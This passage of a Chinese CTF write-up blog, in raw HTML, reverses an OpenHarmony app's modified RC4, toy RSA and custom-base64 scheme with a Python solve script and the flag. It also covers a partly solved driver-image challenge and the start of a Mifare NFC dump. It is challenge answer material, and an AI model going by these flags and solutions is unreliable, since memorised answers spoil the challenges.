class="hljs-string">&quot;function&quot;</span> == typeof(obj2) ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>) != <span class="hljs-number">0</span>) &#123;<br>        obj3.paramsGenerator_ = obj2;<br>    &#125;<br>    obj3.__inputText = ObservedPropertySimplePU(<span class="hljs-string">&quot;&quot;</span>, obj3, <span class="hljs-string">&quot;inputText&quot;</span>);<br>    obj3.__isDialogShow = ObservedPropertySimplePU(<span class="hljs-literal">null</span>, obj3, <span class="hljs-string">&quot;isDialogShow&quot;</span>);<br>    obj3.__dialogMessage = ObservedPropertySimplePU(<span class="hljs-string">&quot;&quot;</span>, obj3, <span class="hljs-string">&quot;dialogMessage&quot;</span>);<br>    obj3.targetCipher = createarraywithbuffer([<span class="hljs-string">&quot;ndG5nZa=&quot;</span>, <span class="hljs-string">&quot;nte3ndK=&quot;</span>, <span class="hljs-string">&quot;nJy2nJi=&quot;</span>, <span class="hljs-string">&quot;mtK0mJG=&quot;</span>, <span class="hljs-string">&quot;nde5mZK=&quot;</span>, <span class="hljs-string">&quot;mJK5nJK=&quot;</span>, <span class="hljs-string">&quot;ntaXnJu=&quot;</span>, <span class="hljs-string">&quot;ndG5nZa=&quot;</span>, <span class="hljs-string">&quot;mZC4mtC=&quot;</span>, <span class="hljs-string">&quot;nZa5mZe=&quot;</span>, <span class="hljs-string">&quot;nJC1nZi=&quot;</span>, <span class="hljs-string">&quot;mJK0ntq=&quot;</span>, <span class="hljs-string">&quot;mta4nta=&quot;</span>, <span class="hljs-string">&quot;mZm5nW==&quot;</span>, <span class="hljs-string">&quot;mZG0mJq=&quot;</span>, <span class="hljs-string">&quot;ntCZnZi=&quot;</span>, <span class="hljs-string">&quot;nJyYmJe=&quot;</span>, <span class="hljs-string">&quot;mJy5ntq=&quot;</span>, <span class="hljs-string">&quot;mtK0nJa=&quot;</span>, <span class="hljs-string">&quot;ndK2nJm=&quot;</span>, <span class="hljs-string">&quot;ndyXmJe=&quot;</span>, <span class="hljs-string">&quot;ntmWnZi=&quot;</span>, <span class="hljs-string">&quot;mJK5nJK=&quot;</span>, <span class="hljs-string">&quot;nZe0nq==&quot;</span>, <span class="hljs-string">&quot;ndaZmJu=&quot;</span>, <span class="hljs-string">&quot;ndqXndm=&quot;</span>, <span class="hljs-string">&quot;mtiWnda=&quot;</span>, <span class="hljs-string">&quot;nJy2nJi=&quot;</span>, <span class="hljs-string">&quot;ndqXndm=&quot;</span>, <span class="hljs-string">&quot;mtyZodq=&quot;</span>, <span class="hljs-string">&quot;mtK0mJG=&quot;</span>, <span class="hljs-string">&quot;ndy5ndu=&quot;</span>, <span class="hljs-string">&quot;ndiZndC=&quot;</span>, <span class="hljs-string">&quot;mZK3mJe=&quot;</span>, <span class="hljs-string">&quot;ndmYmZG=&quot;</span>, <span class="hljs-string">&quot;mJi0nte=&quot;</span>, <span class="hljs-string">&quot;ndK2nJm=&quot;</span>, <span class="hljs-string">&quot;mtK0nJa=&quot;</span>]);<br>    obj3.secretKey = <span class="hljs-string">&quot;OHCTF2025&quot;</span>;<br>    obj3.__isInitialized = ObservedPropertySimplePU(<span class="hljs-literal">null</span>, obj3, <span class="hljs-string">&quot;isInitialized&quot;</span>);<br>    obj3.setInitiallyProvidedValue(arg1);<br>    obj3.finalizeConstruction();<br>    <span class="hljs-keyword">return</span> obj3;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>key 为 <code>OHCTF2026</code>，将 <code>OHCTF2025</code> 覆盖了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object #~@<span class="hljs-number">0</span>&gt;#onPageShow(Object functionObject, Object newTarget, Index <span class="hljs-built_in">this</span>) &#123;<br>    <span class="hljs-keyword">if</span> (isfalse(istrue(<span class="hljs-built_in">this</span>.isInitialized) == <span class="hljs-literal">null</span> ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>) != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-built_in">this</span>.secretKey = <span class="hljs-string">&quot;OHCTF2026&quot;</span>;<br>    <span class="hljs-built_in">this</span>.isInitialized = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>rc 4 的 s 盒进行了魔改，对 keystream 进行了相加而不是异或</p><p>rsa 加密中 mod 75067，指数为 7</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object #~@<span class="hljs-number">0</span>&gt;#rc4Encrypt(Object functionObject, Object newTarget, Index <span class="hljs-built_in">this</span>, Object arg0, Object arg1) &#123;<br>    objArr = [Object];<br>    i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (i2 = <span class="hljs-number">0</span>; (i2 &lt; <span class="hljs-number">256</span> ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>) != <span class="hljs-number">0</span>; i2 = tonumer(i2) + <span class="hljs-number">1</span>) &#123;<br>        objArr.push(i2);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (i3 = <span class="hljs-number">0</span>; (i3 &lt; <span class="hljs-number">256</span> ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>) != <span class="hljs-number">0</span>; i3 = tonumer(i3) + <span class="hljs-number">1</span>) &#123;<br>        i = ((i + objArr[i]) + arg0.charCodeAt(i % arg0.length)) % <span class="hljs-number">256</span>;<br>        ldobjbyvalue = objArr[i3];<br>        objArr[i3] = objArr[i];<br>        objArr[i] = ldobjbyvalue;<br>    &#125;<br>    i4 = <span class="hljs-number">0</span>;<br>    i5 = <span class="hljs-number">0</span>;<br>    newobjrange = Uint8Array(arg1.length);<br>    <span class="hljs-keyword">for</span> (i6 = <span class="hljs-number">0</span>; (i6 &lt; arg1.length ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>) != <span class="hljs-number">0</span>; i6 = tonumer(i6) + <span class="hljs-number">1</span>) &#123;<br>        i4 = (i4 + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>;<br>        i5 = (i5 + objArr[i4]) % <span class="hljs-number">256</span>;<br>        ldobjbyvalue2 = objArr[i4];<br>        objArr[i4] = objArr[i5];<br>        objArr[i5] = ldobjbyvalue2;<br>        newobjrange[i6] = (arg1.charCodeAt(i6) + objArr[(objArr[i4] + objArr[i5]) % <span class="hljs-number">256</span>]) % <span class="hljs-number">256</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> newobjrange;<br>&#125;<br><br><span class="hljs-comment">/* JADX WARN: Type inference failed for: r21v25, types: [int] */</span><br><span class="hljs-keyword">public</span> Object #~@<span class="hljs-number">0</span>&gt;#rsaEncrypt(Object functionObject, Object newTarget, Index <span class="hljs-built_in">this</span>, Object arg0) &#123;<br>    objArr = [Object];<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; (i &lt; arg0.length ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>) != <span class="hljs-number">0</span>; i = tonumer(i) + <span class="hljs-number">1</span>) &#123;<br>        objArr[i] = <span class="hljs-built_in">this</span>.modPow(arg0[i], <span class="hljs-number">7</span>, <span class="hljs-number">75067</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> objArr;<br>&#125;<br><br><span class="hljs-keyword">public</span> Object #~@<span class="hljs-number">0</span>&gt;#customBase64(Object functionObject, Object newTarget, Index <span class="hljs-built_in">this</span>, Object arg0) &#123;<br>    newobjrange = <span class="hljs-keyword">import</span> &#123; <span class="hljs-keyword">default</span> as util &#125; from <span class="hljs-string">&quot;@ohos:util&quot;</span>.Base64Helper();<br>    encodeToStringSync = newobjrange.encodeToStringSync(arg0);<br>    from = Array.from(<span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/&quot;</span>);<br>    obj = <span class="hljs-string">&quot;&quot;</span>;<br>    obj2 = getiterator(encodeToStringSync);<br>    obj3 = obj2.next;<br>    i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>        callthisN = obj3();<br>        throw.ifnotobject(callthisN);<br>        <span class="hljs-keyword">if</span> (istrue(callthisN.done) != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> obj;<br>        &#125;<br>        r27 = callthisN.value;<br>        <span class="hljs-keyword">try</span> &#123;<br>            indexOf = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>.indexOf(r27);<br>            r27 = ((-<span class="hljs-number">1</span>) != indexOf ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>);<br>            obj = (obj == <span class="hljs-literal">true</span> ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>) + (r27 != <span class="hljs-number">0</span> ? from[indexOf] : <span class="hljs-string">&quot;=&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (ExceptionI0 unused) &#123;<br>            z = r27;<br>            <span class="hljs-keyword">if</span> (istrue(i) == <span class="hljs-literal">null</span>) &#123;<br>                i = <span class="hljs-number">1</span>;<br>                obj4 = <span class="hljs-literal">null</span>;<br>                r272 = hole;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    obj5 = obj2.return;<br>                    obj3 = obj5;<br>                    r272 = (<span class="hljs-number">0</span> == obj5 ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>);<br>                &#125; <span class="hljs-keyword">catch</span> (ExceptionI0 unused2) &#123;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (r272 == <span class="hljs-number">0</span>) &#123;<br>                    obj4 = obj3();<br>                    <span class="hljs-keyword">throw</span>(z);<br>                    throw.ifnotobject(obj4);<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">throw</span>(z);<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>因此加密流程为：enc -&gt; rc4  -&gt; 每个元素 rsa -&gt; 对每个结果 toString -&gt; stringToUint8Array() -&gt; base64 encode</p><p>可以写出逆向脚本：base64 -&gt;  rsa -&gt; rc4</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> invert<br><br>STANDARD_TABLE = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">base64_decode_change_table</span>(<span class="hljs-params">c, new_table</span>):<br>    new_c = [STANDARD_TABLE[new_table.index(ch)] <span class="hljs-keyword">if</span> ch != <span class="hljs-string">&#x27;=&#x27;</span> <span class="hljs-keyword">else</span> ch <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> c]<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">return</span> base64.b64decode(<span class="hljs-string">&#x27;&#x27;</span>.join(new_c)).decode()<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> base64.b64decode(<span class="hljs-string">&#x27;&#x27;</span>.join(new_c))<br><br><br>s = [<span class="hljs-string">&quot;ndG5nZa=&quot;</span>, <span class="hljs-string">&quot;nte3ndK=&quot;</span>, <span class="hljs-string">&quot;nJy2nJi=&quot;</span>, <span class="hljs-string">&quot;mtK0mJG=&quot;</span>, <span class="hljs-string">&quot;nde5mZK=&quot;</span>, <span class="hljs-string">&quot;odqXmG==&quot;</span>, <span class="hljs-string">&quot;nJa1mJK=&quot;</span>, <span class="hljs-string">&quot;nZe0nq==&quot;</span>, <span class="hljs-string">&quot;ntK0nda=&quot;</span>,<br>     <span class="hljs-string">&quot;mJK5nJK=&quot;</span>, <span class="hljs-string">&quot;nJiYndG=&quot;</span>, <span class="hljs-string">&quot;mZyYndC=&quot;</span>, <span class="hljs-string">&quot;nJy5&quot;</span>, <span class="hljs-string">&quot;mJqWodC=&quot;</span>, <span class="hljs-string">&quot;nZe4nJK=&quot;</span>, <span class="hljs-string">&quot;nJiXnJG=&quot;</span>, <span class="hljs-string">&quot;ndK2nJm=&quot;</span>, <span class="hljs-string">&quot;nJC3odu=&quot;</span>, <span class="hljs-string">&quot;mtiWnda=&quot;</span>,<br>     <span class="hljs-string">&quot;ndK2nJm=&quot;</span>, <span class="hljs-string">&quot;nte4ma==&quot;</span>, <span class="hljs-string">&quot;ntuYodC=&quot;</span>, <span class="hljs-string">&quot;ndq0odK=&quot;</span>, <span class="hljs-string">&quot;nJiYndG=&quot;</span>, <span class="hljs-string">&quot;mJaYnZK=&quot;</span>, <span class="hljs-string">&quot;nJaZmq==&quot;</span>, <span class="hljs-string">&quot;mJK2ndu=&quot;</span>, <span class="hljs-string">&quot;mta5oti=&quot;</span>,<br>     <span class="hljs-string">&quot;mJu3ntC=&quot;</span>, <span class="hljs-string">&quot;nZaZndm=&quot;</span>, <span class="hljs-string">&quot;mJeXodi=&quot;</span>, <span class="hljs-string">&quot;mtGXmti=&quot;</span>, <span class="hljs-string">&quot;mtqZnW==&quot;</span>, <span class="hljs-string">&quot;ndm1nW==&quot;</span>, <span class="hljs-string">&quot;nJm3ody=&quot;</span>, <span class="hljs-string">&quot;odG4na==&quot;</span>, <span class="hljs-string">&quot;nJy5&quot;</span>, <span class="hljs-string">&quot;mtK0nJa=&quot;</span>]<br><br>target = [<span class="hljs-built_in">int</span>(base64_decode_change_table(i, <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/&quot;</span>)) <span class="hljs-keyword">for</span> i<br>          <span class="hljs-keyword">in</span> s]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mod_pow</span>(<span class="hljs-params">base, exp, mod</span>):<br>    result = <span class="hljs-number">1</span><br>    base %= mod<br>    <span class="hljs-keyword">while</span> exp:<br>        <span class="hljs-keyword">if</span> exp &amp; <span class="hljs-number">1</span>:<br>            result = (result * base) % mod<br>        base = (base * base) % mod<br>        exp &gt;&gt;= <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> result<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rsa_decrypt_array</span>(<span class="hljs-params">cipher_arr</span>):<br>    n = <span class="hljs-number">75067</span><br>    phi = <span class="hljs-number">270</span> * <span class="hljs-number">276</span><br>    d = invert(<span class="hljs-number">7</span>, phi)<br>    <span class="hljs-keyword">return</span> [mod_pow(c, d, n) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> cipher_arr]<br><br><br>plaintext_bytes = rsa_decrypt_array(target)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">KSA</span>(<span class="hljs-params">key</span>):<br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[j] + key[j % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>    <span class="hljs-keyword">return</span> S<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">PRGA</span>(<span class="hljs-params">S</span>):<br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        <span class="hljs-keyword">yield</span> S[(S[i] + S[j]) % <span class="hljs-number">256</span>]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">RC4</span>(<span class="hljs-params">key, text</span>):<br>    S = KSA(key)<br>    keystream = PRGA(S)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>((char - <span class="hljs-built_in">next</span>(keystream)) &amp; <span class="hljs-number">0xff</span> <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> text)<br><br><br>key = <span class="hljs-string">b&quot;OHCTF2026&quot;</span><br><span class="hljs-built_in">print</span>(RC4(key, plaintext_bytes))<br><br></code></pre></td></tr></table></figure><p>拿到 flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">43</span>c70db57b7ddb1ae6adb20f9b87ebf2&#125;<br></code></pre></td></tr></table></figure><h2 id="oh-baby"><a href="#oh-baby" class="headerlink" title="oh~baby"></a>oh~baby</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">你了解鸿蒙的HDF和HCS吗？<br>hcs客户端在<span class="hljs-regexp">/vendor/</span>下<br></code></pre></td></tr></table></figure><p>把 sh 转成 bat 脚本启动 qemu，有图形化，但是其实没啥用</p><img src="https://img.dkdun.cn/v1/2025/12/446c81d9907e7c7d.png" alt="image-20250715015358210" style="zoom: 50%;" /><p>可以看命令行，大概了解了一下提示的 HDF 和 HCS</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">HDF 是鸿蒙的驱动框架<br><span class="hljs-built_in">HCS</span>(HDF Configuration Source)是 HDF 驱动框架的配置描述源码，内容以 Key-Value 为主要形式，和json格式差不多，HCS 主要分为属性(Attribute)和节点(Node)两种结构<br></code></pre></td></tr></table></figure><p>&#x2F;vendor&#x2F;bin 有一个 chall</p><img src="https://img.dkdun.cn/v1/2025/12/ec63f31a34cd8264.png" alt="image-20250716154052180" style="zoom: 50%;" /><p>运行 chall 后会和 chall_driver 驱动交互进行 AES 加密，输入长度必须是16的倍数</p><p>把 chall 文件挂载下来分析</p><p>用 mount 查看挂载点</p><img src="https://img.dkdun.cn/v1/2025/12/6d1a9a5816ccf115.png" alt="image-20250716160616345" style="zoom: 80%;" /><p>把 userdata.img 挂载到 WSL 中</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs swift">mkdir <span class="hljs-operator">-</span>p <span class="hljs-regexp">/mnt/</span>userdata<br>sudo mount <span class="hljs-operator">-</span>o loop &#x27;<span class="hljs-regexp">/mnt/</span>f<span class="hljs-regexp">/CTF question/</span><span class="hljs-type">OpenHarmonyCTF</span><span class="hljs-regexp">/Reverse/</span>oh<span class="hljs-operator">~</span>baby<span class="hljs-regexp">/images/</span>userdata.img&#x27; <span class="hljs-regexp">/mnt/</span>userdata<br></code></pre></td></tr></table></figure><p>在 &#x2F;mnt&#x2F;userdata 拿到 chall</p><p><img src="https://img.dkdun.cn/v1/2025/12/45cf4b20e7ac1254.png" alt="image-20250716163939589"></p><p>main 函数中发现绑定的 chall_service</p><p>但是这个文件也没啥用，binwalk 看 bzImage，发现有一个压缩文件</p><p><img src="https://img.dkdun.cn/v1/2025/12/fb374ec8d97930de.png" alt="image-20250715011828530"></p><p>分析这个 ELF 文件，根据字符串定位到函数，找到了比较的地方</p><p><img src="https://img.dkdun.cn/v1/2025/12/8f93e4d52af99565.png" alt="image-20250716185935811"></p><p>密文值为 <code>8BE07936ADBB8728D93BB1E0AB715353</code></p><p>找了很久都没找到加密函数，放弃了，烂尾了。。。</p><h1 id="HardWare"><a href="#HardWare" class="headerlink" title="HardWare"></a>HardWare</h1><h2 id="A-Mysterious-Card"><a href="#A-Mysterious-Card" class="headerlink" title="A Mysterious Card"></a>A Mysterious Card</h2><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">Few days ago, I found a card <span class="hljs-keyword">on</span> <span class="hljs-keyword">the</span> street. I trying <span class="hljs-keyword">to</span> analysis <span class="hljs-keyword">the</span> card, <span class="hljs-keyword">but</span> failed <span class="hljs-keyword">to</span> do so.<br>Can you <span class="hljs-keyword">try</span> <span class="hljs-keyword">to</span> retrieve <span class="hljs-keyword">the</span> content <span class="hljs-keyword">for</span> <span class="hljs-keyword">me</span>? UwU<br>The content <span class="hljs-keyword">does</span> <span class="hljs-keyword">not</span> hold <span class="hljs-keyword">the</span> <span class="hljs-built_in">word</span> flag&#123;&#125;, please add <span class="hljs-keyword">the</span> <span class="hljs-built_in">word</span> flag&#123; <span class="hljs-keyword">and</span> &#125; <span class="hljs-keyword">between</span> <span class="hljs-keyword">the</span> content you found inside <span class="hljs-keyword">the</span> card.<br></code></pre></td></tr></table></figure><p>是一个 NFC 文件</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Filetype</span>: Flipper NFC device<br><span class="hljs-attribute">Version</span>: <span class="hljs-number">4</span><br><span class="hljs-comment"># Device type can be ISO14443-3A, ISO14443-3B, ISO14443-4A, ISO14443-4B, ISO15693-3, FeliCa, NTAG/Ultralight, Mifare Classic, Mifare Plus, Mifare DESFire, SLIX, ST25TB</span><br><span class="hljs-attribute">Device</span> type: Mifare Classic<br><span class="hljs-comment"># UID is common for all formats</span><br><span class="hljs-attribute">UID</span>: <span class="hljs-number">6</span>D <span class="hljs-number">79</span> <span class="hljs-number">5</span>F <span class="hljs-number">63</span> <span class="hljs-number">61</span> <span class="hljs-number">72</span> <span class="hljs-number">64</span><br><span class="hljs-comment"># ISO14443-3A specific data</span><br><span class="hljs-attribute">ATQA</span>: <span class="hljs-number">00</span> <span class="hljs-number">44</span><br><span class="hljs-attribute">SAK</span>: <span class="hljs-number">08</span><br><span class="hljs-comment"># Mifare Classic specific data</span><br><span class="hljs-attribute">Mifare</span> Classic type: <span class="hljs-number">1</span>K<br><span class="hljs-attribute">Data</span> format version: <span class="hljs-number">2</span><br><span class="hljs-comment"># Mifare Classic blocks, &#x27;??&#x27; means unknown data</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">0</span>: <span class="hljs-number">6</span>D <span class="hljs-number">79</span> <span class="hljs-number">5</span>F <span class="hljs-number">63</span> <span class="hljs-number">61</span> <span class="hljs-number">72</span> <span class="hljs-number">64</span> <span class="hljs-number">08</span> <span class="hljs-number">44</span> <span class="hljs-number">00</span> FF FF FF FF FF FF<br><span class="hljs-attribute">Block</span> <span class="hljs-number">1</span>: C0 <span class="hljs-number">01</span> <span class="hljs-number">03</span> E1 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">2</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">3</span>: A0 A1 A2 A3 A4 A5 <span class="hljs-number">78</span> <span class="hljs-number">77</span> <span class="hljs-number">88</span> C1 <span class="hljs-number">73</span> <span class="hljs-number">64</span> <span class="hljs-number">49</span> <span class="hljs-number">65</span> <span class="hljs-number">41</span> <span class="hljs-number">51</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">4</span>: <span class="hljs-number">03</span> <span class="hljs-number">30</span> D1 <span class="hljs-number">01</span> <span class="hljs-number">2</span>C <span class="hljs-number">54</span> <span class="hljs-number">02</span> <span class="hljs-number">65</span> <span class="hljs-number">6</span>E <span class="hljs-number">6</span>d <span class="hljs-number">61</span> <span class="hljs-number">35</span> <span class="hljs-number">74</span> <span class="hljs-number">33</span> <span class="hljs-number">72</span> <span class="hljs-number">31</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">5</span>: <span 